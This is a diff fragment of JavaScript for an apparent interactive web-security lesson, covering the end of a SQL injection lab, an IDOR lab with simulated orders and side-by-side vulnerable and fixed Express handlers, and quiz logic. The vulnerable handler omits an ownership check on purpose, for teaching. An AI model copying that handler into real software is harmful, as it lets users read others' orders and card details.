+            sqliVerdict.textContent = matches2.length ? "Behaves normally — parameterization changes nothing about legitimate input." : "No matches.";
+          }
+        }
+      }
+
+      document.querySelectorAll('[data-lab="sqli"] .lab-mode-btn').forEach(function (btn) {
+        btn.addEventListener("click", function () {
+          sqliMode = btn.dataset.mode;
+          document.querySelectorAll('[data-lab="sqli"] .lab-mode-btn').forEach(function (b) {
+            b.setAttribute("aria-pressed", b === btn ? "true" : "false");
+          });
+          sqliCode.textContent = CODE_SQLI[sqliMode];
+          runSqli();
+        });
+      });
+      document.querySelectorAll('[data-lab="sqli"] .lab-preset-btn').forEach(function (btn) {
+        btn.addEventListener("click", function () {
+          sqliInput.value = btn.dataset.preset;
+          runSqli();
+        });
+      });
+      document.getElementById("sqliRun").addEventListener("click", runSqli);
+      sqliInput.addEventListener("keydown", function (e) { if (e.key === "Enter") runSqli(); });
+
+      sqliCode.textContent = CODE_SQLI.vulnerable;
+      runSqli();
+
+      /* ---------------- IDOR lab ---------------- */
+
+      var ORDERS = [
+        { id: 201, owner: "alice", item: "Standing desk", total: "$420" },
+        { id: 202, owner: "bob", item: "Noise-cancelling headphones", total: "$260", cardLast4: "4412" }
+      ];
+      var CURRENT_USER = "alice";
+
+      var CODE_IDOR = {
+        vulnerable:
+          'app.get("/api/orders/:id", (req, res) => {\n' +
+          "  const order = db.orders.findById(req.params.id);\n" +
+          "  if (!order) return res.status(404).end();\n" +
+          "  res.json(order);\n" +
+          "});",
+        fixed:
+          'app.get("/api/orders/:id", (req, res) => {\n' +
+          "  const order = db.orders.findById(req.params.id);\n" +
+          "  if (!order) return res.status(404).end();\n" +
+          "  if (order.owner !== req.session.user) {\n" +
+          "    return res.status(403).json({ error: \"forbidden\" });\n" +
+          "  }\n" +
+          "  res.json(order);\n" +
+          "});"
+      };
+
+      var idorMode = "vulnerable";
+      var idorCode = document.getElementById("idorCode");
+      var idorInput = document.getElementById("idorInput");
+      var idorResult = document.getElementById("idorResult");
+      var idorVerdict = document.getElementById("idorVerdict");
+
+      function runIdor() {
+        var id = parseInt(idorInput.value, 10);
+        var order = ORDERS.filter(function (o) { return o.id === id; })[0];
+
+        if (!order) {
+          idorResult.textContent = "404 Not Found";
+          idorVerdict.className = "lab-verdict neutral show";
+          idorVerdict.textContent = "No order with that ID exists.";
+          return;
+        }
+
+        if (idorMode === "vulnerable") {
+          idorResult.textContent = "200 OK\n" + JSON.stringify(order, null, 2);
+          if (order.owner !== CURRENT_USER) {
+            idorVerdict.className = "lab-verdict bad show";
+            idorVerdict.textContent = "Exploited — alice is authenticated, but this is bob's order. The handler checked that the token was valid, never that alice owns order " + id + ". A leaked field (card last 4) went with it.";
+          } else {
+            idorVerdict.className = "lab-verdict neutral show";
+            idorVerdict.textContent = "This happens to be alice's own order, so nothing looks wrong yet — try Bob's order (202).";
+          }
+        } else {
+          if (order.owner !== CURRENT_USER) {
+            idorResult.textContent = "403 Forbidden\n" + JSON.stringify({ error: "forbidden" }, null, 2);
+            idorVerdict.className = "lab-verdict good show";
+            idorVerdict.textContent = "Blocked — the handler now checks order.owner against the session's authenticated user before returning anything, not just that the token is valid.";
+          } else {
+            idorResult.textContent = "200 OK\n" + JSON.stringify(order, null, 2);
+            idorVerdict.className = "lab-verdict neutral show";
+            idorVerdict.textContent = "alice's own order, returned normally — the ownership check passes.";
+          }
+        }
+      }
+
+      document.querySelectorAll('[data-lab="idor"] .lab-mode-btn').forEach(function (btn) {
+        btn.addEventListener("click", function () {
+          idorMode = btn.dataset.mode;
+          document.querySelectorAll('[data-lab="idor"] .lab-mode-btn').forEach(function (b) {
+            b.setAttribute("aria-pressed", b === btn ? "true" : "false");
+          });
+          idorCode.textContent = CODE_IDOR[idorMode];
+          runIdor();
+        });
+      });
+      document.querySelectorAll('[data-lab="idor"] .lab-preset-btn').forEach(function (btn) {
+        btn.addEventListener("click", function () {
+          idorInput.value = btn.dataset.preset;
+          runIdor();
+        });
+      });
+      document.getElementById("idorRun").addEventListener("click", runIdor);
+      idorInput.addEventListener("keydown", function (e) { if (e.key === "Enter") runIdor(); });
+
+      idorCode.textContent = CODE_IDOR.vulnerable;
+      runIdor();
+
+      /* ---------------- Quiz interactivity ---------------- */
+      document.querySelectorAll(".quiz-block").forEach(function (block) {
+        var answer = block.dataset.answer;
+        var explain = block.querySelector(".quiz-explain");
+        var options = block.querySelectorAll(".quiz-option");
+        options.forEach(function (opt) {
+          opt.addEventListener("click", function () {
+            if (block.dataset.answered) return;
+            block.dataset.answered = "true";
+            options.forEach(function (o) {
+              if (o.dataset.choice === answer) o.classList.add("correct");
+              else if (o === opt) o.classList.add("incorrect");
+            });
+            explain.hidden = false;
+          });
+        });
+      });
+    })();
+  </script>
+</body>
+</html>
